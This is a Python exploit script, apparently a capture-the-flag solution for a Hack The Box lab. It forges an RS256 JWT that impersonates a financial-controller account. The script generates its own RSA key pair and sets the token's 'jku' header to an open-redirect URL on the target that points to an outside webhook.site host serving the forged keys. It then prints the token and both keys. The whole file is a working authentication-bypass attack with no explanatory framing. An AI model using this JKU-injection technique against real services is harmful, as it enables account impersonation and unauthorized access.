import base64
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import time

# JWK data
jwk = {
    "kty": "RS256",
    "e": "AQAB",
    "kid": "eab37913-64e3-468d-86d0-5f2043ef3217",
    "n": "oHmXHQ2_Gpbjwx9wTVzP_wzcMIysvTubJTV3N9EL1siLK9ULhNgTgHBy7RZANa1fzNlfPiFBYkSWEoDRDvcSPVP5A0Zvwz8kuW7hhojAOYOYzlTJz9R55AAZkXRtUVnTMoyuvNqNzupAcL4YiSrNFqVdj9mpIr2ZHdp1FXJIQFHdyh_HlEIGrSSJ2OuTdfHxHDW_CupyBR5k7HkzYmwcO_9gd0wYjQDSH4cRDmUqIs_AFUjBhTtFwI2OAwZljkZb3AR1sEVSQTXFBtSpoTBavx0eOvt1fls6jVNBp_yJhnv468oBegdeCIIZ_hcJKElmanF9xO1VwGH9ZowLI1hBUQ"
}

# Decode Base64 URL values
n = int.from_bytes(base64.urlsafe_b64decode(jwk['n'] + "=="), byteorder='big')
e = int.from_bytes(base64.urlsafe_b64decode(jwk['e'] + "=="), byteorder='big')

# Create RSA public key
public_numbers = rsa.RSAPublicNumbers(e, n)
public_key = public_numbers.public_key()

# Generate a private key (for demonstration purposes)
private_key = rsa.generate_private_key(public_exponent=e, key_size=2048)

# Serialize the private key to use it for signing
private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

public_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Payload for the JWT
payload = {
    "email": "financial-controller@frontier-board.htb",
    "iat": int(time.time()),
    "exp": int(time.time()) + 6 * 60 * 60  # 6 hours
}

header = {
  "alg": "RS256",
  "jku": "http://127.0.0.1:1337/api/analytics/redirect?url=https://webhook.site/e2bc15c9-c1c1-411a-a39b-f1ea3b9901c3&ref=http://127.0.0.1:1337",
  "kid": jwk["kid"],
  "typ": "JWT"
}

# Generate JWT
jwt_token = jwt.encode(
    payload, 
    private_pem, 
    algorithm="RS256",
    headers=header
)

print("Generated JWT:")
print(jwt_token)

print("Generated Public Key:")
print(public_pem.decode("utf-8"))

private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()  # No password encryption
)

print("Generated Private Key:")
print(private_pem.decode("utf-8"))